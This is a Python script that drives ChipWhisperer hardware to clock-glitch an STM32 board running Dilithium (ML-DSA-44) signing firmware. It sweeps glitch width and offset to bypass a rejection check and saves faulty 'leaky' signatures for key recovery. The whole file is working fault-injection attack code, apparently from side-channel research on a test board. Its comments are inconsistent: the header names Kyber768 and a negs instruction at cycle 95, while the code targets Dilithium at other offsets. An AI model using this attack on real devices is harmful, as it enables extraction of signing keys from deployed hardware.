#!/usr/bin/env python3
"""
Clock Glitch Attack for Kyber768 (Negs Instruction)
Uses CPA-derived parameters from 24 MHz analysis.

Target: negs instruction at cycle 95 (ext_offset=95)
Mode: Clock XOR (clock_xor)
"""

import chipwhisperer as cw
import time
import numpy as np
import os
import sys
from datetime import datetime
import argparse

FW_PATH = "bin/test_glitch_dilithium.hex"

# === PHASE 2C: TARGETED GLITCH (BYPASS w0/ct0 BOUND) ===
# We successfully captured a leak at: ext_offset=11, width=4.0, offset=5.0
# Drastically narrowing the search window to just this hot-spot to massively increase yield.
WIDTH_OPTIONS = [3.5, 3.8, 4.0, 4.2] 
EXT_OFFSET_RANGE = [8, 9, 10, 11, 12, 13]

# Narrowed fine offset around 5.0 to hit the nanosecond jitter quickly
FINE_OFFSET_RANGE = np.arange(0.0, 15.0, 2.0)  
FINE_OFFSET_RANGE = FINE_OFFSET_RANGE[FINE_OFFSET_RANGE != 0.0]
MAX_ATTEMPTS = 500000


def setup(args):
    """Initialize ChipWhisperer for clock glitching."""
    print("="*60, flush=True)
    print("CLOCK GLITCH ATTACK (Dilithium ML-DSA-44 Signature)", flush=True)
    print("="*60, flush=True)
    
    scope = cw.scope()
    target = cw.target(scope)
    
    # Manual setup (avoid default_setup which resets clock)
    scope.gain.db = 25
    scope.adc.samples = 5000
    scope.adc.offset = 0
    scope.adc.basic_mode = "rising_edge"
    scope.trigger.triggers = "tio4"
    scope.io.tio1 = "serial_rx"
    scope.io.tio2 = "serial_tx"
    scope.io.hs2 = "clkgen"  # Start with normal clock for programming
    
    scope.clock.clkgen_freq = 24000000
    time.sleep(0.5)
    if scope.clock.clkgen_freq < 20000000:
        print(f"ERROR: Clock failed to set to 24MHz. Got: {scope.clock.clkgen_freq}", flush=True)
        sys.exit(1)
    
    scope.clock.adc_src = "clkgen_x4"
    target.baud = 38400
    
    # Clock Glitch configuration
    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "clock_xor"  # Clock glitch (not voltage)
    scope.glitch.trigger_src = "ext_single"
    scope.io.glitch_lp = False  # Disable voltage glitching
    scope.io.glitch_hp = False  # Disable voltage glitching
    scope.glitch.repeat = 1
    
    # We will set ext_offset in the attack loop
    
    return scope, target


def reset(scope, target):
    """Reset the target device with improved reliability."""
    scope.io.nrst = 'low'
    time.sleep(0.1)
    scope.io.nrst = 'high'
    time.sleep(0.1)
    scope.io.nrst = 'high_z'
    
    t = time.time()
    buff = ""
    while time.time() - t < 10.0:
        if target.in_waiting():
            buff += target.read()
            if "WAIT" in buff:
                return True, buff
        time.sleep(0.01)
    return False, buff


def glitch(scope, target, target_key, baseline_key, width, offset):
    """Execute a single clock glitch attempt."""
    scope.glitch.width = width
    scope.glitch.offset = offset
    
    # Wait for next WAIT
    r = ""
    t = time.time()
    while time.time() - t < 5.0:
        if target.in_waiting():
            r += target.read()
            if "WAIT" in r:
                break
    
    if "WAIT" not in r:
        return "timeout", None, None
    
    scope.arm()
    if scope.capture():
        return "no_trig", None, None
    
    # Wait for response (Robust)
    r = ""
    t = time.time()
    # Giving significantly more time for serial to arrive (5.0s) because 4840 bytes at 38400 baud takes > 1.2s
    while time.time() - t < 5.0:
        if target.in_waiting():
            r += target.read()
            
        if "SIG:" in r:
             # Check if we have the full signature token
             tokens = r.split()
             k_idx = tokens.index("SIG:")
             if k_idx + 1 < len(tokens):
                 candidate = tokens[k_idx+1]
                 if len(candidate) == 4840: # ML-DSA-44 sig bytes = 2420 * 2 = 4840
                     break
        time.sleep(0.001)
    
    if target_key in r:
        return "SUCCESS", scope.get_last_trace(), target_key
    elif baseline_key in r:
        return "normal", None, baseline_key
    elif "SIG:" in r:
        idx = r.find("SIG:") + 4
        key = r[idx:idx+4847].strip().split()[0] if len(r) > idx else "?"
        
        # Any different signature is theoretically interesting in this scenario (leakage)
        return "different", None, key
    else:
        return "crash", None, None


def check_dirty_match(key_hex, gold_hex):
    """Check if key matches gold on top 7 bits of every byte."""
    try:
        if len(key_hex) != len(gold_hex): return False
        k = bytes.fromhex(key_hex)
        g = bytes.fromhex(gold_hex)
        
        diff_count = 0
        for i in range(len(k)):
            # If high 7 bits match, it's a candidate for the glitch effect
            if (k[i] & 0xFE) != (g[i] & 0xFE):
                 return False # High bits mismatch, totally different key
            
            if k[i] != g[i]:
                diff_count += 1
        
        # If we get here, all high bits match!
        # If diff_count > 0, it means LSBs caused the difference -> SUCCESS DIRTY
        return True
    except ValueError:
        return False


def main():
    parser = argparse.ArgumentParser(description='Clock glitch attack on negs instruction')
    parser.add_argument('--max_attempts', type=int, default=MAX_ATTEMPTS, help='Maximum attempts')

    args = parser.parse_args()
    
    # Setup CW
    scope, target = setup(args)
    
    print(f"Programming {FW_PATH}...", flush=True)
    cw.program_target(scope, cw.programmers.STM32FProgrammer, FW_PATH)
    print("OK", flush=True)
    
    # NOW switch to glitch mode for the attack
    scope.io.hs2 = "glitch"  # Target clock driven by glitch module
    time.sleep(0.1)
    
    res_ok, out = reset(scope, target)
    if not res_ok:
        print("ERROR: Target failed to initialize!", flush=True)
        print(f"Received: {repr(out)}", flush=True)
        scope.dis(); return
    
    # Wait for keys with robust buffering
    t = time.time()
    while time.time() - t < 15.0:
        if target.in_waiting():
            out += target.read()
            
        # Parse output to check if we have the signatures
        # We expect: SIG: \n <4840-char-hex> \n
        if "SIG:" in out and "GOLD:" in out:
            tokens = out.split()
            # Find index of SIG:
            if "SIG:" in tokens:
                k_idx = tokens.index("SIG:")
                if k_idx + 1 < len(tokens):
                    candidate_key = tokens[k_idx+1]
                    if len(candidate_key) == 4840:
                        break
        time.sleep(0.01)
    
    if "GOLD:" not in out:
        print("ERROR: No GOLD signature!", flush=True)
        print(f"Output: {repr(out)}", flush=True)
        scope.dis(); return
    
    if "SIG:" not in out:
        print("ERROR: No baseline SIG!", flush=True)
        scope.dis(); return
    
    # Robust parsing
    tokens = out.split()
    
    try:
        g_idx = tokens.index("GOLD:")
        target_key = tokens[g_idx+1] # We actually want it to NOT equal this if we bypassed rejection
        
        k_idx = tokens.index("SIG:")
        baseline_key = tokens[k_idx+1] # Normal correct signing behavior
        
        if len(target_key) != 4840 or len(baseline_key) != 4840:
             raise ValueError("Signature length mismatch")
             
    except (ValueError, IndexError) as e:
        print(f"ERROR: Failed to parse keys: {e}", flush=True)
        print(f"Buffer: {repr(out)}", flush=True)
        scope.dis(); return
    
    print(f"DEBUG: Startup Buffer:\n{out}\n", flush=True)
    
    print(f"TARGET (GOLD): {target_key[:40]}...", flush=True)
    print(f"BASELINE:      {baseline_key[:40]}...", flush=True)
    
    print(f"\nCLOCK GLITCH PARAMETERS:", flush=True)
    print(f"  ext_offset: {EXT_OFFSET_RANGE[0]} to {EXT_OFFSET_RANGE[-1]}", flush=True)
    print(f"  width:      {WIDTH_OPTIONS} (% of clock cycle)", flush=True)
    print(f"  offset:     {FINE_OFFSET_RANGE[0]:.1f} to {FINE_OFFSET_RANGE[-1]:.1f}", flush=True)
    print(f"Started:      {datetime.now()}", flush=True)
    print("="*60, flush=True)
    
    os.makedirs("traces_precision", exist_ok=True)
    
    total = crashes = timeouts = normal = different = no_trig = 0
    consecutive_timeouts = 0
    
    try:
        while total < args.max_attempts:
            # Sweep ext_offset from the trigger
            for current_ext_offset in EXT_OFFSET_RANGE:
                scope.glitch.ext_offset = current_ext_offset
                
                for w in WIDTH_OPTIONS:
                    for off in FINE_OFFSET_RANGE:
                        total += 1
                        
                        res, trace, key = glitch(scope, target, target_key, baseline_key, w, off)
                        
                        if res == "different":
                            consecutive_timeouts = 0
                            different += 1
                            print(f"\n*** POTENTIAL LEAKY SIGNATURE! (different) attempts={total} ***", flush=True)
                            print(f"ext_offset={current_ext_offset}, width={w}, offset={off}", flush=True)
                            # Save the leaky signature
                            np.save(f"traces_precision/LEAKY_SIG_e{current_ext_offset}_w{w}_o{off}.npy", trace)
                            with open("DILITHIUM_LEAKY_SIG.txt", "a") as f:
                                f.write(f"LEAKY SIG!\next_offset={current_ext_offset}\nwidth={w}\noffset={off}\nattempts={total}\nsig={key}\n\n")
                            # Force reset to clear any state corruption/latched faults
                            reset(scope, target)
                        
                        elif res == "SUCCESS" or res == "success_dirty":
                            # In Dilithium test harness, target_key = GOLD signature.
                            # Getting it means normal execution (no rejection, or normal rejection bypassed and we happened to generate the exact same sig which is impossible).
                            # Actually, in our setup, normal execution ALWAYS generates GOLD because PRNG is fixed.
                            # So this shouldn't happen unless "normal" logic catches it.
                            pass
                        
                        elif res == "normal":
                            normal += 1
                            consecutive_timeouts = 0
                        elif res == "crash":
                            crashes += 1
                            consecutive_timeouts = 0
                            reset(scope, target)
                        elif res == "timeout":
                            timeouts += 1
                            consecutive_timeouts += 1
                            if consecutive_timeouts > 10:
                                print("\nFATAL: Sync lost. Restarting target...", flush=True)
                                res_ok, _ = reset(scope, target)
                                if not res_ok:
                                    print("FATAL: Target is dead. Plug/Unplug required.", flush=True)
                                    scope.dis(); return
                                consecutive_timeouts = 0
                            else:
                                reset(scope, target)
                        elif res == "no_trig":
                            no_trig += 1
                            reset(scope, target)
                        
                        if total % 25 == 0:
                            print(".", end="", flush=True)
                        if total % 250 == 0:
                            print(f" {total} | T:{timeouts} C:{crashes} D:{different} | ext:{current_ext_offset}", flush=True)
            
            # Print newline after full offset sweep cycle
            print(f" [Sweep Cycle Complete]", flush=True)
        
        print(f"\nNo success after {total} attempts.", flush=True)
    
    except KeyboardInterrupt:
        print(f"\nStopped at {total}", flush=True)
    finally:
        try:
            scope.dis(); target.dis()
        except:
            pass


if __name__ == "__main__":
    main()
